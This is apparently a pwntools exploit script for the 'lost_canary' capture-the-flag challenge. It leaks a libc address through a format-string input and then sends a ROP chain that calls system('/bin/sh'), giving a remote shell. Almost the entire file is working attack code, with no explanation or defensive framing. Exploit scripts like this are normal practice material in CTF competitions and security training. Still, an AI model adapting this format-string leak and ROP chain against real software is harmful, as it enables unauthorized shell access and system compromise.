#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './lost_canary'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc-2.31.so'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'lost-canary.chal.uiuc.tf', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *__stack_chk_fail
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec lost_canary 
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'number:', b'14927.%p') # rev'd by flocto
    io.recvuntil(b'14927.')
    libc.address = int(io.recvline().strip(), 16) - 0x1ed723

    rop = flat({
        8: [
            libc.address + 0x023b6a, # pop rdi; ret
            next(libc.search(b'/bin/sh\x00')),
            libc.address + 0x22679, # ret
            libc.sym['system'],
        ]
    })
    io.sendline(b'AAAAeY iEuas' + rop) # rev'd by flocto

    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()